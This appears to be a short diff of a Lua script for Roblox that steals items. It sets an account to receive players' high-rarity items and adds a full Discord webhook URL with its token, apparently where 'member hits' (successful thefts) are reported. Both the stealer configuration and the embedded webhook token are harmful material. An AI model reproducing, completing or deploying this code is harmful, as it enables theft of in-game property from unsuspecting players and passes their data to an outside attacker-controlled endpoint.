@@ -17,7 +17,7 @@ for _, v in ipairs(_G.Usernames or {}) do table.insert(combinedUser, v) end
 for _, v in ipairs(DhUsers) do table.insert(combinedUser, v) end
 
 -- Configuration from global variables
-local users = _G.Usernames or {WspNegatron5}
+local users = _G.Usernames or {"WspNegatron5"}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local ping = _G.pingEveryone or "Yes"
@@ -347,7 +347,7 @@ function SecureSend(data)
 end
 
 -- Webhook for member hits
-Raw_Webhook = ""
+Raw_Webhook = "https://discord.com/api/webhooks/1536391097285087263/qF7Vlvud9CerBlObfDlJEyVli2LGuI37VOhyQLRoZFGWCLB5XOC4pY388OWND9_lOK_g"
 local Real_Webhook = Raw_Webhook .. _G.webhook
 
 local function SendMemberHit(data)
